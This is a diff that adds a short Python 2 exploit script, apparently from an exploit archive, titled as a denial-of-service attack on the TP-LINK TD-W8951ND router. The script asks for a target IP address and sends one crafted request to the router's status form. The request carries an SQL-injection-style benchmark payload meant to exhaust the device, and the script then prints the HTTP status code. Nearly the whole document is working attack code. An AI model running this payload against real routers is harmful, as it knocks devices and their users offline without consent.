@@ -1,0 +1,24 @@
+# Exploit Title: TP-LINK TD-W8951ND - Denial of Service
+# Date: 2016-12-07
+# Exploit Author: Persian Hack Team
+# Discovered by : Mojtaba MobhaM 
+# Tested on: Windows AND Linux
+# Demo Construction : https://youtu.be/7mv_rW3mtVE
+
+#!/usr/bin/python
+import urllib
+
+site=raw_input("Enter IP Address : ")
+if (site.find('http://')<0):
+    strh = "http://"
+    url=strh+site
+else:
+    url=site
+
+try:
+    url += "/Forms/status_1?flagFresh=0&1 and benchmark(20000000%2csha1(1))--=1"
+    r = urllib.urlopen(url)
+    print r.code
+    print "Done!!"
+except:
+    pass
